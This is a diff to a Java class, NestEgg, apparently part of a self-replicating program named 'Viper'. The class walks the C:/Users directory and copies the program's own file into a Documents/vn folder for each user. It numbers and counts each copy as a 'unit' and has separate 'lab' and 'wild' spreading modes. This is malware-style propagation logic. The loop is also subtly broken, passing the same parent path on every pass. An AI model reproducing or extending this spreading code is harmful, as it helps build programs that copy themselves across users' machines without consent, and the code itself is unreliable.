@@ -8,15 +8,32 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardCopyOption;
 
+import communication.Identification;
+
 public class NestEgg {
 	static String[] inCoded= {"testing","testing","testing"};
-public static void labEgg(Path vPath){
+	static int unitCopys=0;
+	static int unitNum;
+public static void labEgg(Path vPath,int unitNumber){
 	File users= new File("C:/Users");
+	unitNum=unitNumber;
 	File[] targetUsers = users.listFiles();
 	for(int x =0; x<targetUsers.length;x++){
-		createCopy(createFilePath(users.getAbsolutePath()),vPath);
+		String usePath= createFilePath(users.getAbsolutePath());
+		createCopy(usePath,vPath);
+		copyMode(usePath);
 	}
 
+}
+public static void wildEgg(Path vPath,int unitNumber){
+	File users= new File("C:/Users");
+	unitNum=unitNumber;
+	File[] targetUsers = users.listFiles();
+	for(int x =0; x<targetUsers.length;x++){
+		String usePath= createFilePath(users.getAbsolutePath());
+		createCopy(usePath,vPath);
+		
+	}
 }
 public static String createFilePath(String userPath){
 	File uP=new File(userPath+"/Documents/vn");
@@ -43,6 +60,7 @@ public static String createFilePath(String userPath){
 }
 public static void createCopy(String filePath,Path vPath){
 	File nestLocation=new File(filePath);
+	Identification nVID=new Identification();
 	try{
 		 
 		
@@ -71,9 +89,11 @@ public static void createCopy(String filePath,Path vPath){
 		 catch(IOException e){
 		 System.out.println( "Error: "+ e.toString());
 		 }
+	nVID.saveInfo(unitNum++, 0, nestLocation);
 	try {
 		File vF=new File(filePath+"/Viper.java");
 		if(vF.exists()==false){
+			unitCopys++;
 		Files.copy(vPath, nestLocation.toPath(), StandardCopyOption.REPLACE_EXISTING);
 		}
 	} catch (IOException e) {
@@ -81,5 +101,21 @@ public static void createCopy(String filePath,Path vPath){
 		e.printStackTrace();
 	}
 
+}
+public static void copyMode(String filePath){
+	File nestLocation= new File(filePath);
+	File mode=new File(filePath+"/mode.txt");
+	if(mode.exists()==false){
+		try {
+			mode.createNewFile();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+}
+public static int getUnitsCreated(){
+	return unitCopys;
+	
 }
 }
